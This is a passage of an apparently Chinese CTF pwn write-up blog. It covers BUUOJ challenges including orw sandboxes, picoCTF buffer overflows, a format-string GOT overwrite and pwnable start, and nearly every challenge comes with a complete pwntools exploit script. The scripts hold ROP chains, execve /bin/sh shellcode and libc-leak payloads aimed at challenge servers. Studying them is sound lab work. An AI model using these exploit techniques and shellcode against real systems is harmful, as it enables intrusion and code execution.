class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == exit) goto <span class="hljs-number">0011</span> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) goto <span class="hljs-number">0011</span> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) goto <span class="hljs-number">0011</span> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) goto <span class="hljs-number">0011</span> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>) <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW</code></pre></div><p>明显只能执行 open read wirte 函数。</p><div class="hljs"><pre><code class="hljs undefined">#这里可以用pwntools库的一个函数代替,shellcraftc语言:<span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/orw/flag"</span>) &lt;==&gt; 汇编:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/orw/flag"</span>))c语言:<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x20</span>)&lt;==&gt; 汇编:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,<span class="hljs-string">"esp"</span>,<span class="hljs-number">0x20</span>)c语言:<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x20</span>)&lt;==&gt;汇编:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">"esp"</span>,<span class="hljs-number">0x20</span>))</code></pre></div><p>其中 就是以esp当做临时变量 buf的地址，其可以自定义。</p><p>其中open函数执行后，由于是打开了一个新的文件，其返回的fd就是3，所以后面跟着的read的文件描述符也为3。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./orw'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26224</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = []realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()bss = <span class="hljs-number">0x804A128</span> - <span class="hljs-number">0x30</span>payload= asm(shellcraft.open(<span class="hljs-string">"./flag"</span>))payload += asm(shellcraft.read(<span class="hljs-number">3</span>,bss,<span class="hljs-number">0x30</span>))payload += asm(shellcraft.write(<span class="hljs-number">1</span>,bss,<span class="hljs-number">0x30</span>))sl(payload)itr()</code></pre></div><h2 id="V-amp-N2020-公开赛warmup"><a href="#V-amp-N2020-公开赛warmup" class="headerlink" title="V&amp;N2020 公开赛warmup"></a>V&amp;N2020 公开赛warmup</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>开启了沙盒，使用orw获取flag即可。</p><div class="hljs"><pre><code class="hljs undefined">Here <span class="hljs-keyword">is</span> my gift: <span class="hljs-number">0x7f411f85c9c0</span> line  CODE  JT   JF      K================================= <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto <span class="hljs-number">0011</span> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &gt;= <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0011</span> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A == execve) goto <span class="hljs-number">0011</span> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A != write) goto <span class="hljs-number">0010</span> <span class="hljs-number">0006</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = count &gt;&gt; <span class="hljs-number">32</span> # write(fd, buf, count) <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) goto <span class="hljs-number">0010</span> <span class="hljs-number">0008</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = count # write(fd, buf, count) <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x10</span>) goto <span class="hljs-number">0011</span> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div><p>其中，这题因为只有<code>0x10</code>的溢出空间，猛的一看需要栈迁移，但是会发现不知道往哪里迁移。看了师傅们的博客才知道，由于第一个栈空间较大，且与第二个可以溢出的栈是<strong>紧邻</strong>的。然后，就可以在溢出时覆盖一下返回地址，覆盖为ret，这样就可以多一个ret，从而<strong>接着执行</strong>上一个栈帧buf里面构造的rop链。</p><p>并且在orw中，open函数的第一个参数时一个指针地址(<code>*filename</code>)，所以需要先read一下flag的文件名到一个buf当中，然后再进行orw。</p><p>Buf的寻找：<br>在libc中找一个没有用到的地址段即可。比如<code>__free_hook</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/B3tfJG.png" srcset="/img/loading.gif" alt></p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./vn_pwn_warmup'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27585</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)pop_rdi = <span class="hljs-number">0x0000000000021102</span> + libc_basepop_rsi = <span class="hljs-number">0x00000000000202e8</span> + libc_basepop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_baseopen = libc_base+libc.sym[<span class="hljs-string">'open'</span>]read = libc_base+libc.sym[<span class="hljs-string">'read'</span>]puts = libc_base+libc.sym[<span class="hljs-string">'puts'</span>]buf = libc_base+libc.sym[<span class="hljs-string">'__free_hook'</span>]payload = flat([    pop_rdi,<span class="hljs-number">0</span>,pop_rsi,buf,pop_rdx,<span class="hljs-number">8</span>,read,    pop_rdi,buf,pop_rsi,<span class="hljs-number">0</span>,pop_rdx,<span class="hljs-number">0</span>,open,    pop_rdi,<span class="hljs-number">3</span>,pop_rsi,buf,pop_rdx,<span class="hljs-number">0x30</span>,read,    pop_rdi,buf,puts])sa(<span class="hljs-string">':'</span>,payload)<span class="hljs-comment"># debug()</span>ret = libc_base + <span class="hljs-number">0x0000000000000937</span>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x78</span> + p64(ret)sa(<span class="hljs-string">'?'</span>,payload)sleep(<span class="hljs-number">1</span>)<span class="hljs-comment"># debug()</span>s(<span class="hljs-string">'./flag\x00\x00'</span>)itr()</code></pre></div><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>简单的栈溢出，且存在后门。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./PicoCTF_2018_buffer_overflow_1'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29988</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()win = <span class="hljs-number">0x080485CB</span>offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">0x4</span>payload = <span class="hljs-string">'a'</span>*offset + p32(win)sa(<span class="hljs-string">':'</span>,payload)itr()</code></pre></div><h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>类似上题，考个控制传参。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./PicoCTF_2018_buffer_overflow_2'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29988</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()win = <span class="hljs-number">0x80485CB</span>offset = <span class="hljs-number">0x6c</span> + <span class="hljs-number">0x4</span>payload = <span class="hljs-string">'a'</span>*offset + p32(win) + p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xDEADC0DE</span>)s(payload)</code></pre></div><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p>32位的格式化字符串，考的是单次printf多次写入，因为是32位pwntools的<code>fmtstr_payload</code>是十分好用的。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./axb_2019_fmt32'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29147</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()printf_got = <span class="hljs-number">0x804A014</span>payload = <span class="hljs-string">"%9$sA"</span> + p32(<span class="hljs-number">0x804A014</span>)sla(<span class="hljs-string">'me:'</span>,payload)ru(<span class="hljs-string">'Repeater:'</span>)printf_got = uu32(r(<span class="hljs-number">4</span>))libc_base = printf_got - <span class="hljs-number">0x049020</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)offset = <span class="hljs-number">8</span>rce = libc_base + <span class="hljs-number">0x3a80c</span>info_addr(<span class="hljs-string">'rec'</span>,rce)payload = <span class="hljs-string">'a'</span> + fmtstr_payload(offset,&#123;<span class="hljs-number">0x804A014</span>:rce&#125;,write_size = <span class="hljs-string">"byte"</span>,numbwritten = <span class="hljs-number">10</span>)sla(<span class="hljs-string">'me:'</span>,payload)itr()</code></pre></div><h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a><code>pwnable_start</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>32位，无任何保护，作者自己汇编写的程序。<br>分析汇编以后可以认为就是：</p><div class="hljs"><pre><code class="hljs c">write(<span class="hljs-number">1</span>,esp,<span class="hljs-number">20</span>)read(<span class="hljs-number">0</span>,esp,<span class="hljs-number">60</span>)</code></pre></div><p>十分明显的栈溢出，但是难点在shellcode摆上栈以后，如何跳转过去执行。</p><p>利用思路：</p><ul><li>利用控制eip，返回wirte处，泄漏一下栈地址，然后根据偏移算出esp的地址</li><li>摆shellcode上栈，控制好eip</li></ul><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./start'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27834</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-comment"># debug()</span>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)sa(<span class="hljs-string">":"</span>,payload)new_esp = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">4</span>addr_shellcode = new_esp + <span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>info_addr(<span class="hljs-string">'new esp'</span>,new_esp)shellcode  = <span class="hljs-string">"\x31\xc0\x50\x68\x2f\x2f\x73"</span>shellcode += <span class="hljs-string">"\x68\x68\x2f\x62\x69\x6e\x89"</span>shellcode += <span class="hljs-string">"\xe3\x89\xc1\x89\xc2\xb0\x0b"</span>shellcode += <span class="hljs-string">"\xcd\x80\x31\xc0\x40\xcd\x80"</span>s(<span class="hljs-string">'a'</span> * <span class="hljs-number">0x14</span> + p32(addr_shellcode) + shellcode)itr()</code></pre></div><p>Shell code 网上一找有很多，找到一个合适字节限制，且可以执行的即可。</p><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a><code>inndy_rop</code></h2><p>做法跟 <code>cmcc_simplerop</code>基本一样，除了偏移。</p><p>32位下，<code>sys_execve(&quot;sh&quot;, 0, 0, 0)</code> 行不通。（上来测试这个，测试一阵子）</p><h2 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="BJDCTF 2nd secret"></a>BJDCTF 2nd secret</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>慢慢分析可以发现一个溢出点，且利用此处只是可以做到任意地址的数据减1。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/MX0AfS.png" srcset="/img/loading.gif" alt></p><p>然后想到可以在got表处下手，<strong>其中printf、system函数在程序达到一定条件才会运行。所以其got处的值是特定的，并且是相近的。</strong></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XkCKMA.png" srcset="/img/loading.gif" alt></p><p>如图所示，相差10。然后利用原来的溢出点，放入printf的got表地址，让其减10次1，也就是答对10次serect后，让程序走向结束处，调用printf。其printf的buf打印的是name，这个是可控的，写成<code>/bin/sh\x00</code>即可。</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./secret'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29635</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()payload = <span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">"\x00"</span> * <span class="hljs-number">8</span> + p64(elf.got[<span class="hljs-string">'printf'</span>])[:<span class="hljs-number">5</span>]<span class="hljs-comment">#此处payload 因为read那里读的数据大小限制，需要调整一下payload的长度。</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">"What's your name?"</span>,payload)answer = [<span class="hljs-number">0x476B</span>,<span class="hljs-number">0x2D38</span>,<span class="hljs-number">0x4540</span>,<span class="hljs-number">0x3E77</span>,<span class="hljs-number">0x3162</span>,<span class="hljs-number">0x3F7D</span>,<span class="hljs-number">0x357A</span>,<span class="hljs-number">0x3CF5</span>,<span class="hljs-number">0x2F9E</span>,<span class="hljs-number">0x41EA</span>,<span class="hljs-number">0x48D8</span>,<span class="hljs-number">0x2763</span>,<span class="hljs-number">0x474C</span>,<span class="hljs-number">0x3809</span>,<span class="hljs-number">0x2E63</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(answer)):    print(answer[i])    sa(<span 